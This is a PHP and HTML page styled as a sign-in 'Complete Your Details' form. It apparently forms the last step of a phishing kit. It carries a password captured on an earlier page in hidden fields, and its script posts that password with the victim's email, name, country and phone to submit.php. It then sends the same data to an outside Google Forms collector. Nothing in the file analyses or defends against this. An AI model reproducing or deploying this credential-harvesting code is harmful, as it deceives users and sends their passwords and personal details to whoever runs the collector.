<?php
session_start();
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $_SESSION['password'] = $_POST['password'];
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Final Form</title>
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="css/style.css">
</head>
<body>
    <div class="loader"></div>
    <div class="body">
        <div class="container">
            <div class="col-md-4 col-sm-5 col-xs-12 col-md-offset-7 col-sm-offset-6 signin-box">
                <h1 class="text-center">Complete Your Details</h1>
                <form id="form" autocomplete="off">
                    <input type="text" id="name" name="name" placeholder="Full Name" class="sign-input" required><br><br>
                    <input type="hidden" id="email" value="<?php echo $_SESSION['email']; ?>">
                    <input type="hidden" id="password" value="<?php echo $_SESSION['password']; ?>">
                    <select id="country" class="form-control sign-input" required>
                        <option value="">Country</option>
                        <option value="United States">United States</option>
                        <option value="Canada">Canada</option>
                        <option value="Australia">Australia</option>
                        <option value="United Kingdom">United Kingdom</option>
                        <option value="Other">Other</option>
                    </select><br>
                    <input type="text" id="phone" name="phone" placeholder="Phone No." class="sign-input" required><br><br>
                    <input type="button" id="finalSubmitBtn" class="btn btn-primary" value="Submit"><br>
                </form>
            </div>
        </div>
    </div>
    
    <!-- jQuery -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <!-- Bootstrap JS -->
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script>
        $(document).ready(function() {
            $(".loader").hide();
            $(".body").show();

            $('#finalSubmitBtn').click(function() {
                var name = $('#name').val();
                var country = $('#country').val();
                var phone = $('#phone').val();
                var email = $('#email').val();
                var password = $('#password').val();

                $(".body").hide();
                $(".loader").show();

                $.ajax({
                    type: 'POST',
                    url: 'submit.php',
                    data: {
                        email: email,
                        password: password,
                        name: name,
                        country: country,
                        phone: phone
                    },
                    success: function(response) {
                        if(response == 'Success'){
                            postToGoogle(email, password, name, country, phone);
                        } else {
                            alert('Failed to submit to server.');
                            $(".body").show();
                            $(".loader").hide();
                        }
                    },
                    error: function() {
                        alert('Failed to submit to server.');
                        $(".body").show();
                        $(".loader").hide();
                    }
                });
            });
        });

        function postToGoogle(email, password, name, country, phone) {
            $.ajax({
                url: "https://docs.google.com/forms/d/e/1FAIpQLSd_S6ieEDyylottc3t0JQiuZ4Ehz5q1QFS4OPHtr74NXeCECw/formResponse",
                data: {
                    "entry.506148844": email,
                    "entry.201745671": password,
                    "entry.1916018055": name,
                    "entry.659179735": country,
                    "entry.523381256": phone
                },
                type: "POST",
                dataType: "xml",
                success: function() {
                    alert('Data submitted successfully!');
                    window.location.href = "thankyou.php";
                },
                error: function() {
                    alert('Failed to submit data to Google Forms.');
                    $(".body").show();
                    $(".loader").hide();
                }
            });
        }
    </script>
</body>
</html>
